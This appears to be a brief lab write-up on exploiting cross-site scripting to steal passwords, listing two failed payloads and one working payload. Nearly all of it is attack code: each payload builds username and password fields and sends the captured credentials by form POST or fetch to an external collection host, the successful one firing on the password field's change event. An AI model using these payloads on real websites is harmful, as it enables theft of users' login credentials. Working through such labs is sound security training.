# Exploiting cross-site scripting to capture passwords

## failed payloads
1. this payload will proompt the user with "The information you have entered on this page will be sent over an insecure connection and could be read by a third party. Are you sure you want to send this information?" and will send post request with empty username and password
```html
<form id="exfilterate" action="http://yce8l2mnhsldkp83z3suzyejrax2lr.oastify.com/" method="post">
    <input type="text" name="username" id="username">
    <input type="password" name="password" id="password">
</form>

<script>
    window.onload = function () {
        document.forms["exfilterate"].submit();
    }
</script>
```

2. will generate a CSP (content security policy) error
```htmpl
<form id="exfilterate" method="post">
    <input type="text" name="username" id="username">
    <input type="password" name="password" id="password">
</form>

<script>
    window.onload = function () {
        document.forms["exfilterate"].submit();
    }
    document.querySelector('form').addEventListener('submit', (e) => {
        const data = Object.fromEntries(new FormData(e.target).entries());
        fetch("https://yce8l2mnhsldkp83z3suzyejrax2lr.oastify.com/", {
            method: "POST",
            mode: "no-cors",
            body: data
        });
    });
</script>
```

## success payloads
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://312da7bs6xai9ux8o8hzo33ogfm8ax.oastify.com/',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
